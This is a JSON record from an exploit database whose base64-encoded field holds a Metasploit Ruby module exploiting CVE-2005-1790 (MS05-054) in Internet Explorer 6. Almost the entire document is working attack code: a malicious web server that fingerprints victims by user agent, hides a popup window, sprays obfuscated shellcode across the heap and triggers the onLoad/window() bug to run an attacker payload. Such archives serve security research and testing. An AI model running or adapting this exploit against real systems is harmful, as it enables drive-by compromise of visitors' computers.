{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gTm9ybWFsUmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnTWljcm9zb2Z0IEludGVybmV0IEV4cGxvcmVyIEphdmFTY3JpcHQgT25Mb2FkIEhhbmRsZXIgUmVtb3RlIENvZGUgRXhlY3V0aW9uIFZ1bG5lcmFiaWxpdHknLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQlUaGlzIGJ1ZyBpcyB0cmlnZ2VyZWQgd2hlbiB0aGUgYnJvd3NlciBoYW5kbGVzIGEgSmF2YVNjcmlwdCAnb25Mb2FkJyBoYW5kbGVyIGluDQoJCQkJY29uanVuY3Rpb24gd2l0aCBhbiBpbXByb3Blcmx5IGluaXRpYWxpemVkICd3aW5kb3coKScgSmF2YVNjcmlwdCBmdW5jdGlvbi4NCgkJCQlUaGlzIGV4cGxvaXQgcmVzdWx0cyBpbiBhIGNhbGwgdG8gYW4gYWRkcmVzcyBsb3dlciB0aGFuIHRoZSBoZWFwLiBUaGUgamF2YXNjcmlwdA0KCQkJCXByb21wdCgpIHBsYWNlcyBvdXIgc2hlbGxjb2RlIG5lYXIgd2hlcmUgdGhlIGNhbGwgb3BlcmFuZCBwb2ludHMgdG8uICBXZSBjYWxsDQoJCQkJcHJvbXB0KCkgbXVsdGlwbGUgdGltZXMgaW4gc2VwYXJhdGUgaWZyYW1lcyB0byBwbGFjZSBvdXIgcmV0dXJuIGFkZHJlc3MuDQoJCQkJV2UgaGlkZSB0aGUgcHJvbXB0cyBpbiBhIHBvcHVwIHdpbmRvdyBiZWhpbmQgdGhlIG1haW4gd2luZG93LiBXZSBzcHJheSB0aGUgaGVhcA0KCQkJCWEgc2Vjb25kIHRpbWUgd2l0aCBvdXIgc2hlbGxjb2RlIGFuZCBwb2ludCB0aGUgcmV0dXJuIGFkZHJlc3MgdG8gdGhlIGhlYXAuIEkgdXNlDQoJCQkJYSBmYWlybHkgaGlnaCBhZGRyZXNzIHRvIG1ha2UgdGhpcyBleHBsb2l0IG1vcmUgcmVsaWFibGUuIElFIHdpbGwgY3Jhc2ggd2hlbiB0aGUNCgkJCQlleHBsb2l0IGNvbXBsZXRlcy4gIEFsc28sIHBsZWFzZSBub3RlIHRoYXQgSW50ZXJuZXQgRXhwbG9yZXIgbXVzdCBhbGxvdyBwb3B1cHMNCgkJCQlpbiBvcmRlciB0byBjb250aW51ZSBleHBsb2l0YXRpb24uDQoJCQl9LA0KCQkJJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdBdXRob3InICAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSdCZW5qYW1pbiBUb2JpYXMgRnJhbnonLCAjIERpc2NvdmVyeQ0KCQkJCQknU3R1YXJ0IFBlYXJzb24nLCAgICAgICAgIyBQcm9vZiBvZiBDb25jZXB0DQoJCQkJCSdTYW0gU2hhcnBzJyAgICAgICAgICAgICAjIE1ldGFzcGxvaXQgcG9ydA0KCQkJCV0sDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbJ01TQicsICdNUzA1LTA1NCddLA0KCQkJCQlbJ0NWRScsICcyMDA1LTE3OTAnXSwNCgkJCQkJWydPU1ZEQicsICcxNzA5NCddLA0KCQkJCQlbJ1VSTCcsICdodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC8xMzc5OS9pbmZvJ10sDQoJCQkJCVsnVVJMJywgJ2h0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDA1LTE3OTAnXSwNCgkJCQldLA0KCQkJJ0RlZmF1bHRPcHRpb25zJyA9Pg0KCQkJCXsNCgkJCQkJJ0VYSVRGVU5DJyA9PiAncHJvY2VzcycsDQoJCQkJCSdJbml0aWFsQXV0b1J1blNjcmlwdCcgPT4gJ21pZ3JhdGUgLWYnLA0KCQkJCX0sDQoJCQknUGF5bG9hZCcgICAgICAgID0+DQoJCQkJew0KCQkJCQknU3BhY2UnICAgID0+IDEwMDAsDQoJCQkJCSdCYWRDaGFycycgPT4gIlx4MDAiLA0KCQkJCQknQ29tcGF0JyAgID0+DQoJCQkJCQl7DQoJCQkJCQkJJ0Nvbm5lY3Rpb25UeXBlJyA9PiAnLWZpbmQnLA0KCQkJCQkJfSwNCgkJCQkJJ1N0YWNrQWRqdXN0bWVudCcgPT4gLTM1MDAsDQoJCQkJfSwNCgkJCSdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQoJCQknVGFyZ2V0cycgICAgICAgID0+DQoJCQkJWw0KCQkJCQlbICdJbnRlcm5ldCBFeHBsb3JlciA2IG9uIFdpbmRvd3MgWFAnLCB7ICdpZnJhbWVzJyA9PiA0IH0gXSwNCgkJCQkJWyAnSW50ZXJuZXQgRXhwbG9yZXIgNiBXaW5kb3dzIDIwMDAnLCAgeyAnaWZyYW1lcycgPT4gOCB9IF0sDQoJCQkJXSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ05vdiAyMSAyMDA1JywNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoJZW5kDQoNCglkZWYgZXhwbG9pdA0KCQlAdmFyX3JlZGlyID0gcmFuZF90ZXh0X2FscGhhKHJhbmQoMTAwKSsxKQ0KCQlzdXBlcg0KCWVuZA0KDQoJZGVmIGF1dG9fdGFyZ2V0KGNsaSwgcmVxdWVzdCkNCgkJbXl0YXJnZXQgPSBuaWwNCg0KCQlhZ2VudCA9IHJlcXVlc3QuaGVhZGVyc1snVXNlci1BZ2VudCddDQoJCXByaW50X3N0YXR1cygiQ2hlY2tpbmcgdXNlciBhZ2VudDogI3thZ2VudH0iKQ0KDQoJCWlmIChhZ2VudCA9fiAvTVNJRSA2XC4wLyAmJiBhZ2VudCA9fiAvV2luZG93cyBOVCA1XC4xLykNCgkJCW15dGFyZ2V0ID0gdGFyZ2V0c1swXSAgICMgSUU2IG9uIFhQDQoJCWVsc2lmIChhZ2VudCA9fiAvTVNJRSA2XC4wLyAmJiBhZ2VudCA9fiAvV2luZG93cyBOVCA1XC4wLykNCgkJCW15dGFyZ2V0ID0gdGFyZ2V0c1sxXQkjIElFNiBvbiAyMDAwDQoJCWVsc2UNCgkJCXByaW50X2Vycm9yKCJVbmtub3duIFVzZXItQWdlbnQgI3thZ2VudH0gZnJvbSAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9IikNCgkJZW5kDQoNCgkJbXl0YXJnZXQNCgllbmQNCg0KDQoJZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxdWVzdCkNCgkJbXl0YXJnZXQgICA9IGF1dG9fdGFyZ2V0KGNsaSwgcmVxdWVzdCkNCgkJdmFyX3RpdGxlICA9IHJhbmRfdGV4dF9hbHBoYShyYW5kKDEwMCkgKyAxKQ0KCQlmdW5jX21haW4gID0gcmFuZF90ZXh0X2FscGhhKHJhbmQoMTAwKSArIDEpDQoNCgkJaGVhcHNwcmF5ID0gOjpSZXg6OkV4cGxvaXRhdGlvbjo6SlNPYmZ1Lm5ldyAlUXwNCmZ1bmN0aW9uIGhlYXBzcHJheSgpDQp7DQoJc2hlbGxjb2RlID0gdW5lc2NhcGUoJyN7UmV4OjpUZXh0LnRvX3VuZXNjYXBlKHJlZ2VuZXJhdGVfcGF5bG9hZChjbGkpLmVuY29kZWQpfScpOw0KCXZhciBiaWdibG9jayA9IHVuZXNjYXBlKCIje1JleDo6VGV4dC50b191bmVzY2FwZShtYWtlX25vcHMoNCkpfSIpOw0KCXZhciBoZWFkZXJzaXplID0gMjA7DQoJdmFyIHNsYWNrc3BhY2UgPSBoZWFkZXJzaXplICsgc2hlbGxjb2RlLmxlbmd0aDsNCgl3aGlsZSAoYmlnYmxvY2subGVuZ3RoIDwgc2xhY2tzcGFjZSkgYmlnYmxvY2sgKz0gYmlnYmxvY2s7DQoJdmFyIGZpbGxibG9jayA9IGJpZ2Jsb2NrLnN1YnN0cmluZygwLHNsYWNrc3BhY2UpOw0KCXZhciBibG9jayA9IGJpZ2Jsb2NrLnN1YnN0cmluZygwLGJpZ2Jsb2NrLmxlbmd0aCAtIHNsYWNrc3BhY2UpOw0KCXdoaWxlIChibG9jay5sZW5ndGggKyBzbGFja3NwYWNlIDwgMHg0MDAwMCkgYmxvY2sgPSBibG9jayArIGJsb2NrICsgZmlsbGJsb2NrOw0KCXZhciBtZW1vcnkgPSBuZXcgQXJyYXkoKTsNCglmb3IgKGkgPSAwOyBpIDwgMjUwOyBpKyspeyBtZW1vcnlbaV0gPSBibG9jayArIHNoZWxsY29kZSB9DQoNCgl2YXIgcmV0ID0gIiI7DQoJdmFyIGZpbGxtZW0gPSAiIjsNCg0KCWZvciAoaSA9IDA7IGkgPCA1MDA7IGkrKykNCgkJcmV0ICs9IHVuZXNjYXBlKCIldTBGMEYldTBGMEYiKTsNCglmb3IgKGkgPSAwOyBpIDwgMjAwOyBpKyspDQoJCWZpbGxtZW0gKz0gcmV0Ow0KDQoJcHJvbXB0KGZpbGxtZW0sICIiKTsNCn0NCnwNCgkJaGVhcHNwcmF5Lm9iZnVzY2F0ZQ0KDQoJCW5vZnVuYyA9IDo6UmV4OjpFeHBsb2l0YXRpb246OkpTT2JmdS5uZXcgJVF8DQoNCmlmIChkb2N1bWVudC5sb2NhdGlvbi5ocmVmLmluZGV4T2YoIiN7QHZhcl9yZWRpcn0iKSA9PSAtMSkNCnsNCgl2YXIgY291bnRlciA9IDA7DQoNCg0KCXRvcC5jb25zb2xlUmVmID0gb3BlbignJywnQmxhbmtXaW5kb3cnLA0KCSd3aWR0aD0xMDAsaGVpZ2h0PTEwMCcNCgkrJyxtZW51YmFyPTAnDQoJKycsdG9vbGJhcj0xJw0KCSsnLHN0YXR1cz0wJw0KCSsnLHNjcm9sbGJhcnM9MCcNCgkrJyxsZWZ0PTEnDQoJKycsdG9wPTEnDQoJKycscmVzaXphYmxlPTEnKQ0KCXNlbGYuZm9jdXMoKQ0KDQoNCglmb3IgKGNvdW50ZXIgPSAwOyBjb3VudGVyIDwgI3tteXRhcmdldFsnaWZyYW1lcyddfTsgY291bnRlcisrKQ0KCXsNCgkJdG9wLmNvbnNvbGVSZWYuZG9jdW1lbnQud3JpdGVsbignPGlmcmFtZSB3aWR0aD0xIGhlaWdodD0xIHNyYz0nK2RvY3VtZW50LmxvY2F0aW9uLmhyZWYrJz9wPSN7QHZhcl9yZWRpcn08L2lmcmFtZT4nKTsNCgl9DQoJZG9jdW1lbnQud3JpdGVsbigiPGJvZHkgb25sb2FkPVxcInNldFRpbWVvdXQoJyN7ZnVuY19tYWlufSgpJyw2MDAwKVxcIj4iKTsNCg0KfQ0KZWxzZQ0Kew0KCSN7aGVhcHNwcmF5LnN5bSgnaGVhcHNwcmF5Jyl9KCk7DQp9DQp8DQoNCgkJbm9mdW5jLm9iZnVzY2F0ZQ0KDQoJCW1haW4gPSAlUXwNCmZ1bmN0aW9uICN7ZnVuY19tYWlufSgpDQp7DQoJZG9jdW1lbnQud3JpdGUoIjxUSVRMRT4je3Zhcl90aXRsZX08L1RJVExFPiIpOw0KCWRvY3VtZW50LndyaXRlKCI8Ym9keSBvbmxvYWQ9d2luZG93KCk7PiIpOw0KDQoJd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOw0KfQ0KfA0KDQoJCWh0bWwgPSAlUXwNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAvL0VOIj4NCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi1nYiI+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD13aW5kb3dzLTEyNTIiPg0KPHNjcmlwdD4NCiN7bm9mdW5jfQ0KI3toZWFwc3ByYXl9DQoje21haW59DQo8L3NjcmlwdD4NCjwvaGVhZD4NCjxib2R5Pg0KPC9ib2R5Pg0KPC9odG1sPg0KfA0KDQoJCXByaW50X3N0YXR1cygiU2VuZGluZyAje3NlbGYubmFtZX0gdG8gY2xpZW50ICN7Y2xpLnBlZXJob3N0fSIpDQoJCSMgVHJhbnNtaXQgdGhlIGNvbXByZXNzZWQgcmVzcG9uc2UgdG8gdGhlIGNsaWVudA0KCQlzZW5kX3Jlc3BvbnNlKGNsaSwgaHRtbCwgeyAnQ29udGVudC1UeXBlJyA9PiAndGV4dC9odG1sJywgJ1ByYWdtYScgPT4gJ25vLWNhY2hlJyB9KQ0KDQoJCSMgSGFuZGxlIHRoZSBwYXlsb2FkDQoJCWhhbmRsZXIoY2xpKQ0KCWVuZA0KZW5k", 
    "filename": "platforms/windows/remote/18365.rb", 
    "id": "18365", 
    "cves": [
        "CVE-2005-1790"
    ]
}